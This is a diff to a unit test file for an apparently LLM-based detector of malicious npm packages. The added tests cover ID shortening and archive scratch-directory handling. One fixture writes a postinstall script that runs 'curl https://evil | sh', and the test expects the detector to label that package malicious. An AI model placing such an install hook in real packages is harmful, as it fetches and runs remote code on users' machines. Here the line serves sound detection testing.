@@ -4,9 +4,10 @@ import json
 import tempfile
 import unittest
 from pathlib import Path
+import zipfile
 
 from socketai_reproduce.analysis.models import CodeQLResult, UsageStats
-from socketai_reproduce.config import WorkflowConfig
+from socketai_reproduce.config import WorkflowConfig, build_batch_id, build_run_id
 from socketai_reproduce.workflow import SocketAIWorkflow
 
 
@@ -84,6 +85,29 @@ class FakeLLMClient:
 
 
 class WorkflowTests(unittest.TestCase):
+    def test_build_run_id_compacts_long_input_names(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            long_name = (
+                "2024-09-03-videoads-util-capability-detection-v1.0.3-with-extra-suffix-for-testing.tgz"
+            )
+            sample = Path(tmp) / long_name
+            sample.write_text("placeholder", encoding="utf-8")
+
+            run_id = build_run_id(sample)
+
+            self.assertLessEqual(len(run_id), 52)
+            self.assertRegex(run_id, r"^\d{8}T\d{6}Z-[a-z0-9-]+-[0-9a-f]{10}$")
+
+    def test_build_batch_id_compacts_manifest_names(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            manifest = Path(tmp) / "dataset-main-p0-33-66-100-with-extra-suffix-for-testing.jsonl"
+            manifest.write_text("", encoding="utf-8")
+
+            batch_id = build_batch_id(manifest)
+
+            self.assertLessEqual(len(batch_id), 42)
+            self.assertRegex(batch_id, r"^batch-\d{8}T\d{6}Z-[a-z0-9-]+-[0-9a-f]{10}$")
+
     def test_workflow_exports_debug_artifacts_and_aggregates_threshold(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             package_root = Path(tmp) / "pkg"
@@ -135,6 +159,56 @@ class WorkflowTests(unittest.TestCase):
             self.assertTrue((run_dir / "stages" / malicious_result.file_id / "stage1.json").exists())
             self.assertTrue((run_dir / "exports" / "file_level.csv").exists())
             self.assertTrue((run_dir / "exports" / "package_level.csv").exists())
+
+    def test_archive_detection_uses_short_global_scratch_outside_batch_run_dir(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            tmp_path = Path(tmp)
+            archive_name = "2024-09-03-videoads-util-capability-detection-v1.0.3.zip"
+            archive_path = tmp_path / archive_name
+
+            with zipfile.ZipFile(archive_path, "w") as archive:
+                archive.writestr(
+                    "package/package.json",
+                    json.dumps(
+                        {
+                            "name": "archive-demo",
+                            "version": "1.0.0",
+                            "scripts": {"postinstall": "node scripts/postinstall.js"},
+                        }
+                    ),
+                )
+                archive.writestr("package/index.js", "module.exports = 1;\n")
+                archive.writestr(
+                    "package/scripts/postinstall.js",
+                    "require('child_process').exec('curl https://evil | sh')\n",
+                )
+
+            scratch_root = tmp_path / "result" / "_scratch"
+            batch_output_root = (
+                tmp_path
+                / "result"
+                / "batches"
+                / "batch-20260408T154352Z-dataset-main-p0-33-66-100-f38ae8c38a"
+                / "runs"
+            )
+            workflow = SocketAIWorkflow(
+                config=WorkflowConfig(
+                    model="fake-model",
+                    provider="fake-provider",
+                    use_codeql=False,
+                    scratch_output_dir=scratch_root,
+                ),
+                llm_client=FakeLLMClient(),
+                codeql_prescreener=None,
+            )
+
+            result = workflow.detect(archive_path, batch_output_root)
+
+            extracted_package_root = Path(result.run_meta.package_root).resolve()
+            run_output_dir = Path(result.run_meta.output_dir).resolve()
+            self.assertTrue(extracted_package_root.is_relative_to(scratch_root.resolve()))
+            self.assertFalse(extracted_package_root.is_relative_to(run_output_dir))
+            self.assertEqual(result.package_summary.label, "malicious")
 
 
 def _extract_between(text: str, prefix: str, suffix: str) -> str:
